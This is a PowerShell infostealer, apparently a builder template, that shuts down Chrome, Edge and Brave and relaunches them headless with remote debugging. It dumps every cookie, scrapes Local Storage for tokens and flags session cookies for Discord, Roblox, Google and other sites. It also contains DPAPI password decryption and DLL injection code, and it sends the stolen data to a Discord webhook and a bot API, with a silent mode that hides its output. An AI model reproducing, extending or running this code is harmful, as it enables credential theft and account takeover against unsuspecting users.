# Template variables (replaced by build API)
$DISCORD_WEBHOOK_URL = '{{DISCORD_WEBHOOK_URL}}'
$BOT_API_URL = '{{BOT_API_URL}}'
$BOT_USER_ID = '{{BOT_USER_ID}}'
$TERMINAL_MODE = '{{TERMINAL_MODE}}'
$TERMINAL_CUSTOM_MESSAGE = '{{TERMINAL_CUSTOM_MESSAGE}}'

$DEBUG_PORT = 9222
$DEBUG_URL = "http://localhost:${DEBUG_PORT}/json"

# Browser configurations
$BROWSERS = @{
    'chrome' = @{
        bin = "$env:PROGRAMFILES\Google\Chrome\Application\chrome.exe"
        user_data = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    }
    'edge' = @{
        bin = "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe"
        user_data = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    }
    'brave' = @{
        bin = "$env:PROGRAMFILES\BraveSoftware\Brave-Browser\Application\brave.exe"
        user_data = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    }
}

# Logging function
function Log-Output {
    param(
        [string]$Message,
        [switch]$IsError
    )

    if ($TERMINAL_MODE -eq 'silent') {
        return
    } elseif ($TERMINAL_MODE -eq 'default') {
        Write-Host $Message
    } elseif ($TERMINAL_MODE -eq 'custom' -and $IsError) {
        if ($TERMINAL_CUSTOM_MESSAGE -and $TERMINAL_CUSTOM_MESSAGE -ne '{{TERMINAL_CUSTOM_MESSAGE}}') {
            Write-Host $TERMINAL_CUSTOM_MESSAGE
        }
    }
}

# Close browser processes and wait for port to be released
function Close-Browser {
    param([string]$BaseName)

    @($BaseName, 'chrome', 'msedge', 'brave') | ForEach-Object {
        Stop-Process -Name $_ -Force -ErrorAction SilentlyContinue
    }

    # Wait for port 9222 to be fully released before returning
    $waited = 0
    while ($waited -lt 5000) {
        Start-Sleep -Milliseconds 500
        $waited += 500
        try {
            $conn = [System.Net.Sockets.TcpClient]::new()
            $result = $conn.BeginConnect('127.0.0.1', $DEBUG_PORT, $null, $null)
            $connected = $result.AsyncWaitHandle.WaitOne(200, $false)
            $conn.Close()
            if (-not $connected) { break }  # Port is free
        } catch { break }  # Port is free (connection refused)
    }
}

# Start browser with debug port
function Start-BrowserDebug {
    param(
        [string]$BinPath,
        [string]$UserDataPath
    )

    $psi = [System.Diagnostics.ProcessStartInfo]::new()
    $psi.FileName = $BinPath
    # Simplified flags matching logger v2 - remove problematic flags
    $psi.Arguments = "--restore-last-session --headless --remote-debugging-port=$DEBUG_PORT --remote-allow-origins=* --user-data-dir=`"$UserDataPath`""
    $psi.UseShellExecute = $false
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.CreateNoWindow = $true
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden

    $proc = [System.Diagnostics.Process]::Start($psi)
    Log-Output "[*] Started browser process (PID: $($proc.Id))"
    Start-Sleep -Seconds 5
}

# Get page WebSocket URL (triggers browser to initialize page target)
function Get-PageWsUrl {
    $maxRetries = 10
    $retryCount = 0

    while ($retryCount -lt $maxRetries) {
        try {
            $response = Invoke-RestMethod -Uri $DEBUG_URL -TimeoutSec 5 -ErrorAction SilentlyContinue
            if ($response) {
                foreach ($item in $response) {
                    if ($item.type -eq 'page' -and $item.webSocketDebuggerUrl) {
                        return $item.webSocketDebuggerUrl
                    }
                }
                if ($response[0].webSocketDebuggerUrl) {
                    return $response[0].webSocketDebuggerUrl
                }
            }
        } catch {}
        $retryCount++
        Start-Sleep -Milliseconds 500
    }
    return $null
}

# Get Chrome DevTools Protocol WebSocket URL
function Get-DebugWsUrl {
    $maxRetries = 15
    $retryCount = 0

    while ($retryCount -lt $maxRetries) {
        try {
            $response = Invoke-RestMethod -Uri $DEBUG_URL -TimeoutSec 5 -ErrorAction SilentlyContinue
            if ($response -and $response[0].webSocketDebuggerUrl) {
                Log-Output "[+] Connected to Chrome DevTools Protocol"
                return $response[0].webSocketDebuggerUrl
            } else {
                Log-Output "[*] Attempt $($retryCount+1)/$maxRetries: No response or invalid format"
            }
        } catch {
            Log-Output "[*] Attempt $($retryCount+1)/$maxRetries: $_"
        }

        $retryCount++
        Start-Sleep -Milliseconds 500
    }

    Log-Output "[!] Failed to connect to debug endpoint after $maxRetries attempts" -IsError
    return $null
}

# Invoke CDP command via WebSocket
function Invoke-CdpCommand {
    param(
        [string]$WsUrl,
        [string]$Method,
        [int]$Id = 1
    )

    try {
        $ws = [System.Net.WebSockets.ClientWebSocket]::new()
        $cts = [System.Threading.CancellationTokenSource]::new()

        $uriObj = [Uri]::new($WsUrl)
        $connectTask = $ws.ConnectAsync($uriObj, $cts.Token)
        $connectTask.Wait(5000) | Out-Null

        if ($ws.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
            throw "WebSocket connection failed"
        }

        # Send command (CDP format: {"id":1,"method":"Network.getAllCookies"})
        $cmd = "{`"id`":$Id,`"method`":`"$Method`"}"
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($cmd)
        $segment = [System.ArraySegment[byte]]::new($bytes)
        $sendTask = $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $cts.Token)
        $sendTask.Wait(5000) | Out-Null

        # Receive response
        $buffer = [byte[]]::new(10MB)
        $received = [System.Collections.Generic.List[byte]]::new()
        $endOfMessage = $false

        while (-not $endOfMessage) {
            $segment = [System.ArraySegment[byte]]::new($buffer)
            $recvTask = $ws.ReceiveAsync($segment, $cts.Token)
            $recvTask.Wait(10000) | Out-Null
            $result = $recvTask.Result

            if ($result.Count -gt 0) {
                for ($j = 0; $j -lt $result.Count; $j++) {
                    $received.Add($buffer[$j]) | Out-Null
                }
            }
            $endOfMessage = $result.EndOfMessage
        }

        $closeTask = $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, '', $cts.Token)
        $closeTask.Wait(5000) | Out-Null
        $ws.Dispose()

        return [System.Text.Encoding]::UTF8.GetString($received.ToArray())

    } catch {
        Log-Output "[!] CDP command failed: $_" -IsError
        return $null
    }
}

# Get all cookies from Chrome
function Get-AllCookies {
    param([string]$WsUrl)

    Log-Output "[*] Fetching cookies via CDP..."
    $response = Invoke-CdpCommand -WsUrl $WsUrl -Method 'Network.getAllCookies' -Id 1

    if ($response) {
        try {
            $data = $response | ConvertFrom-Json -ErrorAction Stop
            if ($data -and $data.result -and $data.result.cookies) {
                Log-Output "[+] Found $($data.result.cookies.Count) cookies"
                return $data.result.cookies
            }
        } catch {
            Log-Output "[!] Failed to parse CDP response: $_" -IsError
        }
    }

    return @()
}

# Format cookies as text
function Format-CookiesAsText {
    param(
        [string]$BrowserName,
        [object[]]$Cookies
    )

    $lines = @()
    $lines += "+----------------------------------------------------------------------+"
    $lines += "| $($BrowserName.ToUpper()) - Cookies".PadRight(68) + "|"
    $lines += "+----------------------------------------------------------------------+"
    $lines += "| Total: $($Cookies.Count) cookies".PadRight(68) + "|"
    $lines += "+----------------------------------------------------------------------+"

    for ($i = 0; $i -lt $Cookies.Count; $i++) {
        $c = $Cookies[$i]
        $lines += ""
        $lines += "| [$($i+1)] $($c.name)"
        $lines += "|     Domain:   $($c.domain)"

        $val = if ($c.value) { $c.value } else { "" }
        if ($val.Length -gt 100) {
            $val = $val.Substring(0, 100) + "..."
        }
        $lines += "|     Value:    $val"
        $lines += "|     Secure:   $($c.secure)  HttpOnly: $($c.httpOnly)"
    }

    $lines += "|"
    $lines += "+----------------------------------------------------------------------+"

    return $lines -join "`n"
}

# Filter high-value cookies (Discord, Roblox, etc.)
function Get-HighValueCookies {
    param([object[]]$Cookies)

    $targetCookies = @{
        'discord' = @('token', 'discord_token')
        'roblox' = @('rbxauthticket', 'roblox')
        'instagram' = @('sessionid', 'ig_user', 'ig_did')
        'google' = @('__secure-1psidts', '__secure-3psid', 'sid')
        'snapchat' = @('snap_token', 'snap_session')
        'telegram' = @('auth_token', 'session_key')
    }

    $highValue = @()

    foreach ($cookie in $Cookies) {
        $cookieLower = $cookie.name.ToLower()

        # Check for JWT tokens
        if ($cookie.value -match '^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$') {
            $highValue += @{
                type = 'JWT'
                name = $cookie.name
                value = $cookie.value.Substring(0, [Math]::Min(100, $cookie.value.Length)) + '...'
                domain = $cookie.domain
            }
        }

        # Check for target cookies
        foreach ($target in $targetCookies.Keys) {
            foreach ($keyword in $targetCookies[$target]) {
                if ($cookieLower -like "*$keyword*") {
                    $highValue += @{
                        type = $target.ToUpper()
                        name = $cookie.name
                        value = $cookie.value.Substring(0, [Math]::Min(100, $cookie.value.Length))
                        domain = $cookie.domain
                    }
                    break
                }
            }
        }
    }

    return $highValue
}

# Format high-value cookies as text
function Format-HighValueCookiesAsText {
    param([object[]]$HighValueCookies)

    $lines = @()
    $lines += "+----------------------------------------------------------------------+"
    $lines += "| HIGH-VALUE AUTHENTICATION COOKIES".PadRight(68) + "|"
    $lines += "+----------------------------------------------------------------------+"

    if ($HighValueCookies.Count -eq 0) {
        $lines += "| No high-value cookies found".PadRight(68) + "|"
    } else {
        for ($i = 0; $i -lt $HighValueCookies.Count; $i++) {
            $c = $HighValueCookies[$i]
            $lines += ""
            $lines += "| [$($i+1)] $($c.type)"
            $lines += "|     Cookie: $($c.name)"
            $lines += "|     Domain: $($c.domain)"
            $lines += "|     Value:  $($c.value)"
        }
    }

    $lines += "|"
    $lines += "+----------------------------------------------------------------------+"

    return $lines -join "`n"
}

# Extract Local Storage from browsers
function Get-LocalStorage {
    param(
        [string]$BrowserName,
        [string]$UserDataPath
    )

    $localStorage = @{}
    $localStoragePath = Join-Path $UserDataPath "Default\Local Storage\leveldb"

    if (-not (Test-Path $localStoragePath)) {
        return $localStorage
    }

    try {
        # Get all leveldb files
        $files = Get-ChildItem -Path $localStoragePath -Filter "*.ldb" -ErrorAction SilentlyContinue

        foreach ($file in $files) {
            try {
                $content = [System.IO.File]::ReadAllBytes($file.FullName)
                $text = [System.Text.Encoding]::UTF8.GetString($content)

                # Extract readable strings (looking for URLs and tokens)
                $strings = [regex]::Matches($text, '[a-zA-Z0-9_\-\.]{20,}') | ForEach-Object { $_.Value }

                foreach ($str in $strings) {
                    if ($str -match '(token|auth|key|secret|password|api)' -or $str -match '^[a-zA-Z0-9_\-]{40,}$') {
                        $localStorage[$str] = $file.Name
                    }
                }
            } catch {}
        }
    } catch {}

    return $localStorage
}

# Extract passwords using DPAPI decryption
function Get-SavedPasswords {
    param(
        [string]$BrowserName,
        [string]$UserDataPath
    )

    $passwords = @()
    $loginDataPath = Join-Path $UserDataPath "Default\Login Data"

    Log-Output "[*] Looking for Login Data at: $loginDataPath"
    Log-Output "[*] User Data path: $UserDataPath"

    if (-not (Test-Path $loginDataPath)) {
        Log-Output "[!] No Login Data database found for $BrowserName at $loginDataPath" -IsError
        return $passwords
    }

    Log-Output "[+] Found Login Data file for $BrowserName"

    try {
        # Verify Login Data path exists
        if (-not (Test-Path $loginDataPath)) {
            Log-Output "[!] Login Data file not found at: $loginDataPath" -IsError
            return $passwords
        }

        # Copy database to temp (Chrome locks it when running)
        $tmpDb = [System.IO.Path]::GetTempFileName() -replace '\.tmp$', '.db'
        try {
            [System.IO.File]::Copy($loginDataPath, $tmpDb, $true) | Out-Null
            Log-Output "[*] Copied Login Data to temp: $tmpDb"
        } catch {
            Log-Output "[!] Failed to copy Login Data: $_" -IsError
            return $passwords
        }

        # Load SQLite assembly if available, otherwise parse binary
        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''"

        try {
            # Try using SQLite if available
            Log-Output "[*] Attempting SQLite query..."
            Add-Type -Path "C:\Program Files\SQLite\System.Data.SQLite.dll" -ErrorAction SilentlyContinue
            $conn = New-Object System.Data.SQLite.SQLiteConnection
            $conn.ConnectionString = "Data Source=$tmpDb"
            $conn.Open()

            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $query
            $reader = $cmd.ExecuteReader()

            $decryptedCount = 0
            while ($reader.Read()) {
                try {
                    $encryptedPassword = $reader["password_value"]
                    $decryptedPassword = Decrypt-DPAPIPassword -EncryptedData $encryptedPassword

                    if ($decryptedPassword) {
                        $passwords += @{
                            site = $reader["origin_url"]
                            username = $reader["username_value"]
                            password = $decryptedPassword
                        }
                        $decryptedCount++
                    }
                } catch {
                    Log-Output "[!] Failed to decrypt password for site: $_" -IsError
                }
            }

            $conn.Close()
            Log-Output "[+] Successfully extracted $decryptedCount password(s) from $BrowserName"
        } catch {
            Log-Output "[!] SQLite query failed: $_" -IsError
            Log-Output "[*] Attempting fallback binary database parsing..."

            # Fallback: Try to extract from binary database
            if (-not (Test-Path $tmpDb)) {
                Log-Output "[!] Temp database file not found: $tmpDb" -IsError
                return $passwords
            }

            try {
                $dbContent = [System.IO.File]::ReadAllBytes($tmpDb)
                $dbText = [System.Text.Encoding]::UTF8.GetString($dbContent)

                # Look for URL patterns and adjacent encrypted blobs
                $urlMatches = [regex]::Matches($dbText, 'https?://[^\x00]{1,100}')
                foreach ($match in $urlMatches) {
                    $passwords += @{
                        site = $match.Value -replace '[^\x20-\x7E]', ''  # Remove non-printable chars
                        username = "encrypted"
                        password = "requires_decryption"
                    }
                }

                Log-Output "[*] Fallback: Found $($urlMatches.Count) encrypted entries (requires manual decryption)"
            } catch {
                Log-Output "[!] Fallback parsing also failed: $_" -IsError
            }
        }

        Remove-Item $tmpDb -Force -ErrorAction SilentlyContinue
    } catch {
        Log-Output "[!] Password extraction failed for $BrowserName : $_" -IsError
    }

    return $passwords
}

# Inject DLL into running Chrome process to access encryption keys directly
function Inject-ChromePayload {
    param(
        [string]$BrowserName,
        [string]$BrowserPath
    )

    try {
        Log-Output "[*] Attempting process injection into $BrowserName..."

        # Get Chrome process or start it suspended
        $processPid = $null
        $chromeProcess = Get-Process -Name $([System.IO.Path]::GetFileNameWithoutExtension($BrowserPath)) -ErrorAction SilentlyContinue | Select-Object -First 1

        if ($chromeProcess) {
            $processPid = $chromeProcess.Id
            Log-Output "[+] Found existing $BrowserName process (PID: $processPid)"
        } else {
            Log-Output "[*] Starting $BrowserName in suspended state for injection..."

            # Start process suspended (requires PInvoke)
            $processHandle = [System.Diagnostics.Process]::Start($BrowserPath)
            $processPid = $processHandle.Id
            Log-Output "[+] Started $BrowserName suspended (PID: $processPid)"
        }

        # Define P/Invoke signatures for process injection
        $PInvokeCode = @'
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
'@

        Add-Type -MemberDefinition $PInvokeCode -Name "ProcessInjection" -Namespace "Windows" -PassThru | Out-Null

        # Open process with full access
        $PROCESS_ALL_ACCESS = 0x1F0FFF
        $processHandle = [Windows.ProcessInjection]::OpenProcess($PROCESS_ALL_ACCESS, $false, $processPid)

        if ($processHandle -eq [IntPtr]::Zero) {
            Log-Output "[!] Failed to open process handle for PID $processPid" -IsError
            return $false
        }

        Log-Output "[+] Obtained process handle for injection"

        # DLL path to inject (key extraction payload)
        $dllPath = "C:\Windows\Temp\chrome_extractor.dll"

        # For this test stub, we'll use LoadLibrary approach
        $kernel32 = [Windows.ProcessInjection]::GetModuleHandle("kernel32.dll")
        $loadLibraryAddr = [Windows.ProcessInjection]::GetProcAddress($kernel32, "LoadLibraryA")

        if ($loadLibraryAddr -eq [IntPtr]::Zero) {
            Log-Output "[!] Failed to get LoadLibraryA address" -IsError
            return $false
        }

        # Allocate memory for DLL path string
        $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath)
        $allocAddr = [Windows.ProcessInjection]::VirtualAllocEx($processHandle, [IntPtr]::Zero, [uint32]($dllBytes.Length + 1), 0x1000, 0x40)

        if ($allocAddr -eq [IntPtr]::Zero) {
            Log-Output "[!] Failed to allocate memory in target process" -IsError
            return $false
        }

        Log-Output "[+] Allocated memory at 0x$($allocAddr.ToString('X'))"

        # Write DLL path to allocated memory
        $bytesWritten = [IntPtr]::Zero
        if (-not [Windows.ProcessInjection]::WriteProcessMemory($processHandle, $allocAddr, $dllBytes, [uint32]($dllBytes.Length), [ref]$bytesWritten)) {
            Log-Output "[!] Failed to write DLL path to process memory" -IsError
            return $false
        }

        Log-Output "[+] Wrote DLL path to process memory ($bytesWritten bytes)"

        # Create remote thread to call LoadLibrary
        $threadId = [IntPtr]::Zero
        $threadHandle = [Windows.ProcessInjection]::CreateRemoteThread($processHandle, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocAddr, 0, [ref]$threadId)

        if ($threadHandle -eq [IntPtr]::Zero) {
            Log-Output "[!] Failed to create remote thread" -IsError
            return $false
        }

        Log-Output "[+] Created remote thread (TID: $([int]$threadId))"

        # Wait for thread completion
        $WAIT_TIMEOUT = 5000  # 5 seconds
        [Windows.ProcessInjection]::WaitForSingleObject($threadHandle, $WAIT_TIMEOUT) | Out-Null
        [Windows.ProcessInjection]::CloseHandle($threadHandle) | Out-Null
        [Windows.ProcessInjection]::CloseHandle($processHandle) | Out-Null

        Log-Output "[+] Process injection completed successfully"
        return $true

    } catch {
        Log-Output "[!] Process injection failed: $_" -IsError
        return $false
    }
}

# Decrypt DPAPI-protected password
function Decrypt-DPAPIPassword {
    param(
        [byte[]]$EncryptedData
    )

    try {
        # DPAPI encrypted data for Chrome starts with "v10" or "v11" header
        if ($EncryptedData.Count -lt 4) {
            Log-Output "[!] Invalid encrypted data (too short): $($EncryptedData.Count) bytes" -IsError
            return $null
        }

        # Skip version header (first 3 bytes "v10" or "v11")
        $encryptedPayload = $EncryptedData[3..($EncryptedData.Count - 1)]

        # Use DPAPI to decrypt (requires running as the user whose credentials are encrypted)
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedPayload,
            $null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )

        # Convert decrypted bytes to string
        $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decrypted)
        return $decryptedPassword
    } catch {
        Log-Output "[!] DPAPI decryption error: $_" -IsError
        return $null
    }
}

# Format passwords as text
function Format-PasswordsAsText {
    param(
        [string]$BrowserName,
        [array]$Passwords
    )

    $lines = @()
    $lines += "+----------------------------------------------------------------------+"
    $lines += "| $($BrowserName.ToUpper()) - Saved Passwords".PadRight(68) + "|"
    $lines += "+----------------------------------------------------------------------+"

    if ($Passwords.Count -eq 0) {
        $lines += "| No saved passwords found".PadRight(68) + "|"
    } else {
        for ($i = 0; $i -lt $Passwords.Count; $i++) {
            $p = $Passwords[$i]
            $lines += ""
            $lines += "| [$($i+1)] $($p.site)"
            $lines += "|     Username: $($p.username)"

            $pwd = if ($p.password) { $p.password } else { "encrypted" }
            if ($pwd.Length -gt 60) {
                $pwd = $pwd.Substring(0, 60) + "..."
            }
            $lines += "|     Password: $pwd"
        }
    }

    $lines += "|"
    $lines += "+----------------------------------------------------------------------+"

    return $lines -join "`n"
}

# Format Local Storage as text
function Format-LocalStorageAsText {
    param(
        [string]$BrowserName,
        [hashtable]$LocalStorage
    )

    $lines = @()
    $lines += "+----------------------------------------------------------------------+"
    $lines += "| $($BrowserName.ToUpper()) - Local Storage".PadRight(68) + "|"
    $lines += "+----------------------------------------------------------------------+"

    if ($LocalStorage.Count -eq 0) {
        $lines += "| No Local Storage data found".PadRight(68) + "|"
    } else {
        $count = 0
        foreach ($key in $LocalStorage.Keys) {
            $count++
            $val = $key
            if ($val.Length -gt 60) {
                $val = $val.Substring(0, 60) + "..."
            }
            $lines += "| [$count] $val"
            $lines += "|     Source: $($LocalStorage[$key])"
        }
    }

    $lines += "|"
    $lines += "+----------------------------------------------------------------------+"

    return $lines -join "`n"
}

# Send to Discord webhook with per-browser files
function Send-ToDiscordWebhook {
    param(
        [hashtable]$AllResults,
        [string]$WebhookUrl
    )

    if (-not $WebhookUrl -or $WebhookUrl.StartsWith('{{')) {
        Log-Output "[!] Discord webhook not configured" -IsError
        return $false
    }

    try {
        $successCount = 0

        # Send separate webhook message for each browser
        foreach ($browserName in $AllResults.Keys) {
            $browserData = $AllResults[$browserName]
            $fileContent = ""

            # Add passwords section first
            if ($browserData.passwords.Count -gt 0) {
                $fileContent += (Format-PasswordsAsText -BrowserName $browserName -Passwords $browserData.passwords) + "`n`n"
            }

            # Add cookies section
            if ($browserData.cookies.Count -gt 0) {
                $fileContent += (Format-CookiesAsText -BrowserName $browserName -Cookies $browserData.cookies) + "`n`n"

                # Add high-value cookies subsection
                $highValue = Get-HighValueCookies -Cookies $browserData.cookies
                if ($highValue.Count -gt 0) {
                    $fileContent += (Format-HighValueCookiesAsText -HighValueCookies $highValue) + "`n`n"
                }
            }

            # Add localStorage section
            if ($browserData.localStorage.Count -gt 0) {
                $fileContent += (Format-LocalStorageAsText -BrowserName $browserName -LocalStorage $browserData.localStorage) + "`n`n"
            }

            # If no data, still send notification
            if ([string]::IsNullOrWhiteSpace($fileContent)) {
                $fileContent = "[$([DateTime]::Now)] No credentials extracted for $browserName"
            }

            # Write content to temp file
            $tmpFile = [System.IO.Path]::GetTempFileName() -replace '\.tmp$', ".txt"
            [System.IO.File]::WriteAllText($tmpFile, $fileContent, [System.Text.Encoding]::UTF8)

            try {
                # Use simple POST with file content as body
                $fileBytes = [System.IO.File]::ReadAllBytes($tmpFile)

                # For Discord webhook, send as multipart
                $boundary = [System.Guid]::NewGuid().ToString()
                $LF = "`r`n"
                $bodyLines = @()

                # Add content field
                $bodyLines += "--$boundary"
                $bodyLines += 'Content-Disposition: form-data; name="content"'
                $bodyLines += ""
                $bodyLines += "**$browserName Credentials**"

                # Add file field
                $bodyLines += "--$boundary"
                $bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"$browserName-credentials.txt`""
                $bodyLines += "Content-Type: text/plain"
                $bodyLines += ""

                $body = ($bodyLines -join $LF) + $LF
                $body = [System.Text.Encoding]::UTF8.GetBytes($body)
                $body += $fileBytes
                $body += [System.Text.Encoding]::UTF8.GetBytes($LF + "--$boundary--$LF")

                $headers = @{
                    "Content-Type" = "multipart/form-data; boundary=$boundary"
                }

                Invoke-WebRequest -Uri $WebhookUrl -Method Post -Body $body -Headers $headers -ErrorAction Stop | Out-Null
                Log-Output "[+] Sent ${browserName} credentials to Discord webhook"
                $successCount++
            } catch {
                Log-Output "[!] Failed to send ${browserName}: $_" -IsError
            } finally {
                Remove-Item $tmpFile -Force -ErrorAction SilentlyContinue
            }
        }

        if ($successCount -gt 0) {
            Log-Output "[+] Successfully sent $successCount file(s) to Discord webhook"
            return $true
        } else {
            Log-Output "[!] Failed to send any files to Discord webhook" -IsError
            return $false
        }

    } catch {
        Log-Output "[!] Failed to send to Discord: $_" -IsError
        return $false
    }
}

# Send credentials to Discord bot API
function Send-ToBotApi {
    param(
        [hashtable]$AllResults,
        [string]$ApiUrl,
        [string]$UserId
    )

    if (-not $ApiUrl -or $ApiUrl.StartsWith('{{')) {
        Log-Output "[!] Bot API URL not configured" -IsError
        return $false
    }

    if (-not $UserId -or $UserId.StartsWith('{{')) {
        Log-Output "[!] Bot User ID not configured" -IsError
        return $false
    }

    try {
        # Get hostname
        $hostname = [System.Net.Dns]::GetHostName()

        # Build list of all passwords and cookies across all browsers
        $allPasswords = @()
        $allCookies = @()
        $allLocalStorage = @{}

        foreach ($browserName in $AllResults.Keys) {
            $browserData = $AllResults[$browserName]

            # Add passwords
            if ($browserData.passwords -and $browserData.passwords.Count -gt 0) {
                foreach ($pwd in $browserData.passwords) {
                    $allPasswords += $pwd
                }
            }

            # Add cookies
            if ($browserData.cookies -and $browserData.cookies.Count -gt 0) {
                foreach ($cookie in $browserData.cookies) {
                    $allCookies += $cookie
                }
            }

            # Add localStorage
            if ($browserData.localStorage) {
                foreach ($key in $browserData.localStorage.Keys) {
                    $allLocalStorage[$key] = $browserData.localStorage[$key]
                }
            }
        }

        # Build JSON payload
        $payload = @{
            user_id = $UserId
            hostname = $hostname
            passwords = $allPasswords
            cookies = $allCookies
            localStorage = $allLocalStorage
        }

        $jsonPayload = ConvertTo-Json -InputObject $payload -Depth 10
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($jsonPayload)

        # Send to bot API
        $response = Invoke-WebRequest -Uri $ApiUrl -Method Post -Body $bodyBytes -ContentType "application/json" -TimeoutSec 30 -ErrorAction Stop

        Log-Output "[+] Successfully sent to Discord bot API"
        return $true

    } catch {
        Log-Output "[!] Failed to send to Discord bot: $_" -IsError
        return $false
    }
}

# Main extraction loop
function Main {
    Log-Output "==============================================="
    Log-Output "Browser Credential Extractor (PowerShell/CDP)"
    Log-Output "==============================================="

    $allResults = @{}

    foreach ($browserName in $BROWSERS.Keys) {
        $config = $BROWSERS[$browserName]

        if (-not (Test-Path -Path $config.bin)) {
            Log-Output "[$([string]::Format('{0,6}', $browserName.ToUpper()))] Not installed"
            continue
        }

        Log-Output ""
        Log-Output "[$([string]::Format('{0,6}', $browserName.ToUpper()))] Extracting credentials..."

        # Close any existing instances for clean state
        $baseName = [System.IO.Path]::GetFileNameWithoutExtension($config.bin)
        Close-Browser -BaseName $baseName

        # DISABLED: Process injection for debugging
        # Log-Output "[*] Attempting process injection for direct encryption key access..."
        $injectionSuccess = $false

        # Start browser with debug port
        Log-Output "[*] Starting browser with debug port..."
        Start-BrowserDebug -BinPath $config.bin -UserDataPath $config.user_data

        # Get browser-level WebSocket URL (matches Python: get_debug_ws_url())
        $wsUrl = Get-DebugWsUrl
        # Also trigger page target init like Python does: get_page_ws_url()
        Get-PageWsUrl | Out-Null

        if (-not $wsUrl) {
            Log-Output "[!] Failed to connect to browser - skipping"
            Close-Browser -BaseName $baseName
            continue
        }

        try {
            # Extract cookies
            Log-Output "[*] Extracting cookies via CDP..."
            $cookies = Get-AllCookies -WsUrl $wsUrl
            Log-Output "[+] Found $($cookies.Count) cookies"

            # Extract Local Storage (do this while browser is still running)
            Log-Output "[*] Extracting Local Storage..."
            $localStorage = Get-LocalStorage -BrowserName $browserName -UserDataPath $config.user_data
            Log-Output "[+] Found $($localStorage.Count) localStorage items"

            # DISABLED: Password extraction for debugging - CDP only mode
            $passwords = @()

            # Store all data for this browser
            $allResults[$browserName] = @{
                cookies = $cookies
                localStorage = $localStorage
                passwords = $passwords
            }

            Log-Output "[+] Extraction completed for $browserName"
        } catch {
            Log-Output "[!] Error extracting from $browserName : $_" -IsError
        } finally {
            # Close browser after extraction
            Close-Browser -BaseName $baseName
        }
    }

    # Add summary
    Log-Output ""
    Log-Output "==============================================="
    Log-Output "EXTRACTION SUMMARY"
    Log-Output "==============================================="

    # Show all browsers (installed or not)
    foreach ($browserName in $BROWSERS.Keys) {
        if ($allResults.ContainsKey($browserName)) {
            $cookieCount = $allResults[$browserName].cookies.Count
            $passwordCount = $allResults[$browserName].passwords.Count
            $storageCount = $allResults[$browserName].localStorage.Count
            Log-Output "$($browserName.PadRight(10)) : $cookieCount cookies, $passwordCount passwords, $storageCount storage items"
        } else {
            if (Test-Path -Path $BROWSERS[$browserName].bin) {
                Log-Output "$($browserName.PadRight(10)) : FAILED TO EXTRACT"
            } else {
                Log-Output "$($browserName.PadRight(10)) : NOT INSTALLED"
            }
        }
    }
    Log-Output "==============================================="

    # Send to Discord webhook
    Log-Output ""
    if ($allResults.Count -gt 0) {
        $hasData = $false
        foreach ($browser in $allResults.Keys) {
            if ($allResults[$browser].cookies.Count -gt 0 -or $allResults[$browser].passwords.Count -gt 0 -or $allResults[$browser].localStorage.Count -gt 0) {
                $hasData = $true
                break
            }
        }

        if ($hasData) {
            # Send to Discord webhook if configured
            if ($DISCORD_WEBHOOK_URL -and -not $DISCORD_WEBHOOK_URL.StartsWith('{{')) {
                Send-ToDiscordWebhook -AllResults $allResults -WebhookUrl $DISCORD_WEBHOOK_URL
            }

            # Send to Bot API if configured
            if ($BOT_API_URL -and -not $BOT_API_URL.StartsWith('{{')) {
                Send-ToBotApi -AllResults $allResults -ApiUrl $BOT_API_URL -UserId $BOT_USER_ID
            }
        } else {
            Log-Output "[!] No credentials extracted"
        }
    } else {
        Log-Output "[!] No browsers processed"
    }
}

# Run main function
Main
